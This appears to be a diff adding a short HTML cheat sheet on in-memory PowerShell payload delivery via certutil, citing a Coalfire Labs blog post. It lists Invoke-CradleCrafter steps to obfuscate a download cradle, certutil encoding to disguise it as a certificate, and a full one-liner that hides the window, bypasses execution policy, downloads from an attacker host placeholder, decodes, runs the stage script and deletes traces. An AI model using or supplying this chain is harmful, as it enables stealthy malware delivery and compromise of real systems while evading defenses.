@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>CertUtil</title>
+</head><body>https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/powershell-in-memory-injection-using-certutil-exe<br/>
+<br/>
+Invoke-CradleCrafter<br/>
+PS&gt; SET URL &lt;your_web_hosted_payload&gt;&#09;&#09;&#09;#Give CradleCrafter the location of your payload<br/>
+PS&gt; MEMORY &#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;#Use CradleCrafter MEMORY option<br/>
+PS&gt; CERTUTIL&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;#Use the CERTUTIL option for MEMORY<br/>
+PS&gt; ALL&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;#Use all obfuscation options<br/>
+Copy and paste the output into a text file like 'raw.txt'<br/>
+Use CertUtil: certutil -encode raw.txt cert.cer&#09;&#09;&#09;#Use Certutil to base64 encode the raw.txt file into a cert<br/>
+Now, from any terminal: <ul><li style="list-style-type: none">powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://YOUR IP HERE/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 &amp; start /b cmd /c powershell.exe &nbsp;-Exec Bypass -NoExit -File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\cert.cer</li>
+</ul>
+<br/>
+The above command will download the cert with powershell, decode it to a ps1 with certutil, and then exec the new ps1 with powershell. <br/>
+<br/>
+You need to delete the ps1 after your session opens!</body></html>
